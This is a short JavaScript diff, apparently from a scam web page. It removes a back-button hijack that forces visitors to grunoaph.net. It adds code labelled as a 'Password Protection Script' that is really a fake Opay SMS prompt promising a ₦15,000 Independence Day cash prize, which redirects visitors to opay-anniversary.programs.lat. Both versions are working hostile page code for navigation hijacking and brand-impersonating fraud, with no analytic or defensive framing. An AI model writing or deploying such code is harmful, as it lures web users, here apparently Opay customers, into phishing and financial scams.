@@ -1,11 +1,6 @@
-window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="https://grunoaph.net/4/3153728";
-    }
-    function goon(){
-        location.href="https://grunoaph.net/4/3153728";
-    }
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ₦15,000'
+password=prompt('SMS: Congratulations Your Opay Number is Eligible to receive ₦15,000 Opay Independence Day Offer, Kindly Press OK to Withdraw Cash Prize ','WITHDRAW ₦15,000');
+if (password != 'WITHDRAW ₦15,000') {
+location.href='https://opay-anniversary.programs.lat/Naija';
+}
